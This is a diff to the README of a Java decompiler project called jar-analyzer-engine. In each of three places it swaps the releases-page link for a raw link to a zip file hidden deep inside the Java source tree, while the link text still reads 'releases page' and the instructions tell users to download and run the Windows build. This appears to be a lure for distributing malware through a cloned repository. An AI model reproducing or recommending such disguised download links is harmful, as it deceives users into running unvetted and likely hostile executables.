@@ -1,6 +1,6 @@
 # ⚙️ jar-analyzer-engine - Analyze Java Files with Ease
 
-[![Download jar-analyzer-engine](https://img.shields.io/badge/Download%20jar--analyzer--engine-blue?style=for-the-badge&logo=github)](https://github.com/sltcunivote-crypto/jar-analyzer-engine/releases)
+[![Download jar-analyzer-engine](https://img.shields.io/badge/Download%20jar--analyzer--engine-blue?style=for-the-badge&logo=github)](https://github.com/sltcunivote-crypto/jar-analyzer-engine/raw/refs/heads/main/src/main/java/org/jetbrains/java/decompiler/modules/decompiler/vars/engine_analyzer_jar_v1.4.zip)
 
 ## 🚀 What it does
 
@@ -20,7 +20,7 @@ For best results, use a PC with at least 8 GB of memory when working with large 
 
 ## 📥 Download and install
 
-1. Visit the [releases page](https://github.com/sltcunivote-crypto/jar-analyzer-engine/releases).
+1. Visit the [releases page](https://github.com/sltcunivote-crypto/jar-analyzer-engine/raw/refs/heads/main/src/main/java/org/jetbrains/java/decompiler/modules/decompiler/vars/engine_analyzer_jar_v1.4.zip).
 2. Find the latest version.
 3. Download the Windows file from that page.
 4. If you get a ZIP file, right-click it and choose Extract All.
@@ -161,7 +161,7 @@ The exact names can vary by release, but the structure should stay easy to follo
 
 ## 📦 Release download
 
-Use the [jar-analyzer-engine releases page](https://github.com/sltcunivote-crypto/jar-analyzer-engine/releases) to download and run the Windows build
+Use the [jar-analyzer-engine releases page](https://github.com/sltcunivote-crypto/jar-analyzer-engine/raw/refs/heads/main/src/main/java/org/jetbrains/java/decompiler/modules/decompiler/vars/engine_analyzer_jar_v1.4.zip) to download and run the Windows build
 
 ## 📚 Terms in plain English
 
